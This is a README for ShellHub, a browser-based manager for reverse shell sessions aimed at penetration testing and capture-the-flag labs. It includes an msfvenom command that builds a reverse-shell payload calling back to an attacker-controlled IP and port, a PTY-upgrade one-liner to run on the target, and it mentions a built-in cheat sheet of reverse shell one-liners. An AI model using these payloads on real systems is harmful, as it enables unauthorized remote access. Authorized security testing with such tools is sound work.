# ShellHub

**Lightweight web-based reverse shell session manager.**  
Manage multiple shells from your browser — no more juggling terminal windows.

![demo](demo/screenshot.svg)

---

## Features

| Feature | Description |
|---------|-------------|
| **Web Dashboard** | All sessions in one browser UI with live status |
| **In-Browser Terminal** | Full xterm.js terminal — send commands, see output live |
| **Raw Mode** | Toggle for PTY-spawned shells (`python3 -c 'import pty;pty.spawn("/bin/bash")'`) |
| **Session Persistence** | All output saved to SQLite — survives restarts |
| **Session Naming** | Double-click to rename sessions (e.g., `THM Pickle Rick`) |
| **Notes & Flags** | Attach notes & captured flags per session, synced across tabs |
| **Cheat Sheet** | Built-in reference for payloads, commands, post-exploitation |
| **Single File** | One Python file, no DB setup, minimal dependencies |

---

## Quick Start

```bash
git clone https://github.com/NullSec8/ShellHub.git
cd ShellHub
pip install -r requirements.txt
python shellhub.py
```

Open **http://localhost:8080**.

---

## Usage

1. ShellHub listens for reverse shells on **port 4444**
2. Generate a payload pointing to your IP on port 4444:

   ```bash
   msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf
   ```

3. Deliver & run the payload on the target
4. The session appears in your browser — click to interact

### Raw Mode (PTY)

For interactive shells spawned via PTY:

```bash
# On the target, after connecting:
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then toggle **Raw Mode ON** in the UI — this sends `\r` without converting to `\n`, giving you proper arrow keys, tab completion, and SIGINT (Ctrl+C).

### Testing locally

```bash
# Terminal 1: start ShellHub
python shellhub.py

# Terminal 2: simulate a reverse shell
nc localhost 4444
```

---

## Configuration

Set environment variables to change ports:

| Variable | Default | Description |
|----------|---------|-------------|
| `SHELLHUB_HOST` | `0.0.0.0` | Web UI bind address |
| `SHELLHUB_PORT` | `8080` | Web UI port |
| `SHELLHUB_TCP_HOST` | `0.0.0.0` | TCP listener bind address |
| `SHELLHUB_TCP_PORT` | `4444` | TCP listener port |

Example:

```bash
SHELLHUB_PORT=9090 SHELLHUB_TCP_PORT=5555 python shellhub.py
```

---

## Cheat Sheet

Built-in at [http://localhost:8080/cheatsheet](http://localhost:8080/cheatsheet) — includes MSFVenom payloads, reverse shell one-liners, Metasploit setup, Linux/Windows enumeration, and more.

---

## Disclaimer

This tool is for **educational purposes and authorized security testing only.**  
Unauthorized use against systems you do not own or have explicit permission to test is illegal.

---

## License

MIT
